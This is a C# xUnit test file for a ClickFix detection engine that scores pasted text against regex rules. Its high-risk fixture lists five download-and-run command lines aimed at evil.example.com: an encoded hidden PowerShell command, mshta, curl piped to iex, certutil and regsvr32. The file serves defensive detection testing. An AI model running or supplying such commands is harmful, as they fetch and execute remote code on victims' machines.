using ClickFixShield.Core.Models;
using ClickFixShield.Core.Rules;
using Xunit;

namespace ClickFixShield.Tests.Detection;

public class HeuristicDetectionEngineTests
{
    // The real shipped rule set, loaded the same way Program.cs's composition root does -
    // this doubles as the end-to-end sanity check that the shipped rules.json and the
    // engine actually agree with each other.
    private static readonly IReadOnlyList<DetectionRule> ShippedRules =
        HeuristicDetectionEngine.LoadRulesFromFile(Path.Combine(AppContext.BaseDirectory, "Rules", "rules.json"));

    private static readonly HeuristicDetectionEngine Engine = new(ShippedRules);

    public static IEnumerable<object[]> HighRiskPayloads()
    {
        yield return new object[]
        {
            "powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA -windowstyle hidden"
        };
        yield return new object[] { "mshta http://evil.example.com/a.hta" };
        yield return new object[] { "curl http://evil.example.com/a.ps1 | iex" };
        yield return new object[] { "certutil.exe -urlcache -f http://evil.example.com/a.exe a.exe" };
        yield return new object[] { "regsvr32 /u /s /i:http://evil.example.com/a.sct scrobj.dll" };
    }

    [Theory]
    [MemberData(nameof(HighRiskPayloads))]
    public void Evaluate_FlagsKnownClickFixPayloads_AsHighRiskOrAbove(string payload)
    {
        var result = Engine.Evaluate(payload, DateTimeOffset.UtcNow);

        Assert.True(result.Level >= ThreatLevel.HighRisk, $"Expected HighRisk+ for '{payload}' but got {result.Level} (score {result.Score}).");
        Assert.NotEmpty(result.MatchedRuleIds);
    }

    [Fact]
    public void Evaluate_LongBase64BlobAlone_IsFlaggedAtLeastSuspicious()
    {
        // "Man is distinguished..." base64-encoded - no other markers, should still trip
        // the generic low-severity base64 rule plus the entropy bonus it unlocks.
        const string payload = "TWFuIGlzIGRpc3Rpbmd1aXNoZWQsIG5vdCBvbmx5IGJ5IGhpcyByZWFzb24=";

        var result = Engine.Evaluate(payload, DateTimeOffset.UtcNow);

        Assert.True(result.Level > ThreatLevel.Safe, $"Expected above Safe, got {result.Level} (score {result.Score}).");
        Assert.Contains("OBF-BASE64", result.MatchedRuleIds);
    }

    public static IEnumerable<object[]> BenignPayloads()
    {
        yield return new object[] { "The quarterly report is due next Friday afternoon." };
        yield return new object[] { "https://www.wikipedia.org/wiki/Example" };
        yield return new object[] { "dir C:\\Users" };
        yield return new object[] { string.Empty };
    }

    [Theory]
    [MemberData(nameof(BenignPayloads))]
    public void Evaluate_BenignText_IsSafe(string payload)
    {
        var result = Engine.Evaluate(payload, DateTimeOffset.UtcNow);

        Assert.Equal(ThreatLevel.Safe, result.Level);
        Assert.Empty(result.MatchedRuleIds);
    }

    [Fact]
    public void Evaluate_ShortHexLikeToken_DoesNotFalsePositiveDespiteMatchingGenericBase64Rule()
    {
        // A 40-char hex string (git commit hash shape) matches the generic base64-alphabet
        // rule by coincidence, but a hex alphabet has only 16 symbols so its maximum
        // possible Shannon entropy (log2(16) = 4.0 bits/char) can never exceed the engine's
        // >4.0 entropy-bonus threshold. One weak rule match alone must not cross Safe.
        const string gitCommitHash = "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0";

        var result = Engine.Evaluate(gitCommitHash, DateTimeOffset.UtcNow);

        Assert.Equal(ThreatLevel.Safe, result.Level);
    }

    [Fact]
    public void Evaluate_EmptyText_ReturnsSafeWithNoMatches()
    {
        var result = Engine.Evaluate(string.Empty, DateTimeOffset.UtcNow);

        Assert.Equal(0, result.Score);
        Assert.Equal(ThreatLevel.Safe, result.Level);
        Assert.Empty(result.MatchedRuleIds);
    }

    [Fact]
    public void LoadRulesFromJson_ParsesValidRuleSet()
    {
        const string json = """
            [
                { "Id": "R1", "Name": "Rule One", "Pattern": "foo", "Weight": 10, "Category": "Test", "Description": "d" }
            ]
            """;

        var rules = HeuristicDetectionEngine.LoadRulesFromJson(json);

        var rule = Assert.Single(rules);
        Assert.Equal("R1", rule.Id);
        Assert.Equal("foo", rule.Pattern);
        Assert.Equal(10, rule.Weight);
    }

    [Fact]
    public void LoadRulesFromJson_SkipsOnlyTheRuleWithAnInvalidRegex()
    {
        const string json = """
            [
                { "Id": "GOOD", "Name": "Good Rule", "Pattern": "foo", "Weight": 10, "Category": "Test", "Description": "d" },
                { "Id": "BAD", "Name": "Bad Rule", "Pattern": "[unclosed", "Weight": 10, "Category": "Test", "Description": "d" }
            ]
            """;

        var rules = HeuristicDetectionEngine.LoadRulesFromJson(json);

        var rule = Assert.Single(rules);
        Assert.Equal("GOOD", rule.Id);
    }
}
